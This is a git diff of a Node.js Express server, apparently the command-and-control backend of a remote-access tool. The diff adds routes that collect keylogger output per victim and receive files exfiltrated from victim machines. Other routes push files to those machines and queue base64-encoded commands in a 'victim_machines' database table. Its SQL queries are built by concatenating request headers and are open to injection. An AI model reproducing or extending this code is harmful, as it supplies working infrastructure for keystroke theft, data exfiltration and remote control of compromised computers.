@@ -39,16 +39,110 @@ name : "69",
 Age : "18"
 } 
 
-app.post('/downloadfile', (req, res)=>{
-	console.log("Body: " + req.text);
-	fs.writeFile('blah.txt', req.text, function (err) {
+app.get('/infiltrate', (req, res)=>{
+	console.log("Uploading file...");
+
+	con.query("SELECT file_names FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
+		if (err) throw err;
+
+		console.log(result);
+		var base64_output = result[0].file_names;
+                let buff = new Buffer(base64_output, 'base64');
+                let decoded_output = buff.toString('ascii');
+                var json_output = JSON.parse(decoded_output);
+
+		var file_name = json_output[req.headers.cookie];
+		console.log("Infiltrate File: " + file_name);
+
+		fs.readFile(file_name, function(err, data) {
+			res.send(data);
+		});
+	});
+
+	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
+		if (err) throw err;
+		console.log(result);
+		var base64_output = result[0].command;
+		let buff = new Buffer(base64_output, 'base64');
+		let decoded_output = buff.toString('ascii');
+		var json_output = JSON.parse(decoded_output);
+
+		//console.log("Cookie: " + req.headers.cookie);
+		//console.log("Command JSON: %j", json_output["exfiltrate"]);
+		delete json_output["infiltrate"][req.headers.cookie];
+
+		let buff2 = new Buffer(JSON.stringify(json_output));
+		let b64_final = buff2.toString('base64');
+
+		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+			if (err) throw err;
+			console.log(result);
+		});
+	});
+
+});
+			
+
+app.post('/keylogger', (req, res)=>{
+	console.log("Getting keylog output...");
+	
+	fs.appendFile('./keylog/' + req.headers.id + '_keylog.txt', req.text, function (err) {
 		if (err) return console.log(err);
 	});
-	res.send("test download file");
+	
+	console.log("Saved keylog to file!");
+});
+
+	
+app.post('/exfiltrate', (req, res)=>{
+
+	console.log("downloading file...");
+
+	con.query("SELECT file_names FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
+		if (err) throw err;
+
+		console.log(result);
+		var base64_output = result[0].file_names;
+                let buff = new Buffer(base64_output, 'base64');
+                let decoded_output = buff.toString('ascii');
+                var json_output = JSON.parse(decoded_output);
+
+		var file_name = './uploads/' + json_output[req.headers.cookie];
+		console.log("File name: " + file_name);
+
+		console.log(req.text);
+		fs.writeFile(file_name, req.text, function (err) {
+			if (err) return console.log(err);
+		});
+	});
+
+	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
+		if (err) throw err;
+		console.log(result);
+		var base64_output = result[0].command;
+		let buff = new Buffer(base64_output, 'base64');
+		let decoded_output = buff.toString('ascii');
+		var json_output = JSON.parse(decoded_output);
+
+		console.log("Cookie: " + req.headers.cookie);
+		console.log("Command JSON: %j", json_output["exfiltrate"]);
+		delete json_output["exfiltrate"][req.headers.cookie];
+
+		let buff2 = new Buffer(JSON.stringify(json_output));
+		let b64_final = buff2.toString('base64');
+
+		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+			if (err) throw err;
+			console.log(result);
+		});
+
+		res.send("test download file");
+	});
+
 });
 
 //Route for adding cookie 
-app.get('/setuser', (req, res)=>{ 
+app.get('/sendCommandOutput', (req, res)=>{ 
 //res.cookie("userData", users); 
 //res.send('user data added to cookie'); 
 	let b64_output = req.headers.cookie;
@@ -67,8 +161,12 @@ app.get('/setuser', (req, res)=>{
 		console.log(decoded_output);
 		var json_output = JSON.parse(decoded_output);
 		//console.log(json_output["1"]);
+		console.log("before json: %j", json_output);
+		console.log("new json: %j", new_json);
 
-		json_output = { ...json_output, ...new_json };
+		json_output["commands"] = { ...json_output["commands"], ...new_json };
+
+		console.log("after json: %j", json_output);
 
 		let buff2 = new Buffer(JSON.stringify(json_output));
 		let b64_final = buff2.toString('base64');
@@ -88,7 +186,7 @@ app.get('/setuser', (req, res)=>{
 		let decoded_commands = buff.toString('ascii');
 		var json_commands = JSON.parse(decoded_commands);
 		for (var k in new_json) {
-			delete json_commands[k];
+			delete json_commands["commands"][k];
 		}
 
 		let buff2 = new Buffer(JSON.stringify(json_commands));
@@ -113,7 +211,7 @@ app.get('/setuser', (req, res)=>{
 }); 
 
 //Iterate users data from cookie 
-app.get('/getuser', (req, res)=>{ 
+app.get('/getCommands', (req, res)=>{ 
 	//console.log(req);
 	//console.log("Cookies:");
 	//console.log(req.headers.cookie);
